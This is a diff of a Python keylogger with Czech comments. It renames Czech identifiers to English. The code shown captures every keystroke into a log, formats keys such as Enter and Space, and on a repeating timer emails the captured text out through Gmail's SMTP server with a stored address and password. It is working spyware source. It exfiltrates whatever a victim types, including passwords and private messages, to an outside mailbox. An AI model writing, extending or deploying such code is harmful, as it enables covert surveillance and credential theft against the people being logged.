@@ -17,25 +17,25 @@ class Keylogger:
 
     def callback(self,udalost):
         #slouzi k zaznamu jakekoliv udalosti na klavesnici (treba pusteni klavesy)
-        nazev = udalost.nazev
-        if len(nazev) > 1:
+        name = udalost.name
+        if len(name) > 1:
             #tady jeste neresim specialni znaky (ctrl, alt, shift atd.)
-            if nazev == "space":
+            if name == "space":
                 # " " namisto "space"
-                nazev = " "
-            elif nazev == "enter":
+                name = " "
+            elif name == "enter":
                 # prida novy radek pokazde, kdyz se zmackne enter
-                nazev = "[ENTER]\n"
-            elif nazev == "decimalni":
-                nazev = "."
+                name = "[ENTER]\n"
+            elif name == "decimalni":
+                name = "."
             else:
                 # mezery nahradime podtrzitkama
-                nazev = nazev.replace(" ","_")
-                nazev = f"[{nazev.upper()}]"
-        self.log += nazev
+                name = name.replace(" ","_")
+                name = f"[{name.upper()}]"
+        self.log += name
             #pokazde kdyz se pusti nejaka klavesa, tak se stisknute tlacitko ulozi do self.log jako string
 
-    def odeslimail(self,email,heslo,zprava):
+    def sendmail(self,email,heslo,zprava):
         server = smtplib.SMTP(host="smtp.gmail.com", port=587)
             #nastavime pripojeni k SMTP serveru
         server.starttls()
@@ -52,7 +52,7 @@ class Keylogger:
         #vlastne vzdy odesle keylogy a zaroven resetuje self.log
         if self.log:
             #pokud bude neco v promenne self.log -> nahlasime to na mail
-            self.odeslimail(Email_adresa, Email_heslo, self.log)
+            self.sendmail(Email_adresa, Email_heslo, self.log)
         self.log = ""
         Timer(interval=self.interval,function=self.report).start()
 
